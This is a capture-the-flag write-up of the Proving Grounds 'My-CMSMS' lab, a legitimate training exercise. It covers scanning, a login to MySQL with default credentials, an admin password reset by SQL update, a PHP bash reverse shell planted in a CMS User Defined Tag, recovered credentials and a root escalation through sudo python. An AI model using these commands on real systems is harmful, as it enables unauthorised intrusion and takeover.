---
layout: default
title: My-CMSMS
parent: Proving Grounds Play
nav_order: 30
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/my-cmsms]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.158.74
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-17 17:53 EST
Nmap scan report for 192.168.158.74
Host is up (0.063s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)
|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)
|_  256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.
|_http-title: Home - My CMS
3306/tcp  open  mysql   MySQL 8.0.19
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.19_Auto_Generated_Server_Certificate
| Not valid before: 2020-03-25T09:30:14
|_Not valid after:  2030-03-23T09:30:14
| mysql-info:
|   Protocol: 10
|   Version: 8.0.19
|   Thread ID: 46
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolOld, FoundRows, Support41Auth, SupportsTransactions, ODBCClient,
DontAllowDatabaseTableColumn, SupportsCompression, IgnoreSigpipes, SwitchToSSLAfterHandshake, LongPasswo
rd, SupportsLoadDataLocal, ConnectWithDatabase, InteractiveClient, LongColumnFlag, IgnoreSpaceBeforePare
nthesis, Speaks41ProtocolNew, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: *nmDF>\x13o\x155\x0DD)=\x1CP\x02&l}
|_  Auth Plugin Name: mysql_native_password
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000

```

# Enumeration

---

## 80 | HTTP

Site is running an instance of _CMS Made Simple_ version 2.2.13

![version](../../../assets/images/ctfs/proving_grounds/my_cmsms/version.png)

Run gobuster.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
└─$ gobuster dir -u http://192.168.158.74 -w /usr/share/wordlists/custom/large_final.txt -x aspx,php,txt
,conf -t 80 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.158.74
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/custom/large_final.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              aspx,php,txt,conf
[+] Timeout:                 10s
===============================================================
2023/11/17 17:56:44 Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 318] [--> http://192.168.158.74/modules/]
/uploads              (Status: 301) [Size: 318] [--> http://192.168.158.74/uploads/]
/doc                  (Status: 301) [Size: 314] [--> http://192.168.158.74/doc/]
/admin                (Status: 301) [Size: 316] [--> http://192.168.158.74/admin/]
/.htaccess            (Status: 403) [Size: 279]                                                         /.htaccess.txt        (Status: 403) [Size: 279]
/.htaccess.aspx       (Status: 403) [Size: 279]                                                         /.htaccess.conf       (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]                                                         /.htpasswd.conf       (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]                                                         /.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]                                                         /.htpasswd.aspx       (Status: 403) [Size: 279]

```

Check the _/admin_ directory and locate _login.php_

![admin](../../../assets/images/ctfs/proving_grounds/my_cmsms/admin.png)

Checked _searchsploit_ for CMS Made Simple version 2.2 exploits and located a paper.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/my-cmsms]
└─$ searchsploit cms simple 2.2
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                  | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload      | php/webapps/5600.php
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)        | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload          | php/webapps/48742.txt           CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticat | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)           | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                          | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upl | php/webapps/49199.txt           CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution         | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution         | php/webapps/45793.py            CMS Made Simple < 2.2.10 - SQL Injection                              | php/webapps/46635.py
CmsMadeSimple v2.2.17 - Remote Code Execution (RCE)                   | php/webapps/51600.txt           CmsMadeSimple v2.2.17 - session hijacking via Server-Side Template In | php/webapps/51599.txt
CmsMadeSimple v2.2.17 - Stored Cross-Site Scripting (XSS)             | php/webapps/51601.txt
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
---------------------------------------------------------------------- ---------------------------------
 Paper Title                                                          |  Path
---------------------------------------------------------------------- ---------------------------------
CMS Made Simple v2.2.13 - Paper                                       | docs/english/49947-cms-made-simp
---------------------------------------------------------------------- ---------------------------------


```

The paper indicated the MySQL credentials may be default.

I was able to authenticate with _root_ and an _root_ password.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/my-cmsms]
└─$ mysql -u root -p -h 192.168.158.74
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 92
Server version: 8.0.19 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| cmsms_db           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.065 sec)

MySQL [(none)]> use cmsms_db;

```

The paper also provided the following command to change the _admin_ password for the CMS Made Simple site.

```bash
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value
FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'kamino'))) where username = 'admin';

MySQL [cmsms_db]> select * from cms_users;
+---------+----------+----------------------------------+--------------+------------+-----------+-------
------------+--------+---------------------+---------------------+
| user_id | username | password                         | admin_access | first_name | last_name | email
            | active | create_date         | modified_date       |
+---------+----------+----------------------------------+--------------+------------+-----------+-------
------------+--------+---------------------+---------------------+
|       1 | admin    | 59f9ba27528694d9b3493dfde7709e70 |            1 |            |           | admin@
mycms.local |      1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |
+---------+----------+----------------------------------+--------------+------------+-----------+-------
------------+--------+---------------------+---------------------+
1 row in set (0.061 sec)

MySQL [cmsms_db]> update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value
    -> FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'kamino'))) where username = 'admin';
Query OK, 1 row affected (0.063 sec)
Rows matched: 1  Changed: 1  Warnings: 0

```

# Exploitation

---

## Abuse User Defined Tags for Remote Execution

After authenticating to the admin console we can change the code in the _Extensions > User Defined Tags_ menu.

We will apply a PHP system tag to execute a bash reverse shell one-liner.

```bash
system("bash -c 'bash -i >& /dev/tcp/192.168.45.217/9001 0>&1'");
```

![exploit](../../../assets/images/ctfs/proving_grounds/my_cmsms/exploit.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/my-cmsms]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.158.74] 46614
bash: cannot set terminal process group (555): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mycmsms:/var/www/html/admin$ id
id
```

# Post-Exploitation

---

## Enumerate /var/www/html/admin

There is a _.htpasswd_ file that contains a hash.

```bash
www-data@mycmsms:/var/www/html/admin$ cat .htpasswd
TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
```

After decoding this Base64 encoded string it yeilds a Base32 Encoded string.

The Base32 encoded string yeilds credentials for the user _armour_

![base32](../../../assets/images/ctfs/proving_grounds/my_cmsms/base32.png)

Located credentials armour:Shield@123
{: .warn }

## Check Sudo Permissions for Armour

```bash
armour@mycmsms:~$ sudo -l
Matching Defaults entries for armour on mycmsms:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User armour may run the following commands on mycmsms:
    (root) NOPASSWD: /usr/bin/python

```

We can run Python as root so let's just spawn bash shell and get root privileges.

```bash
armour@mycmsms:~$ sudo /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
root@mycmsms:/home/armour# id
uid=0(root) gid=0(root) groups=0(root)
root@mycmsms:/home/armour# whoami
root

```
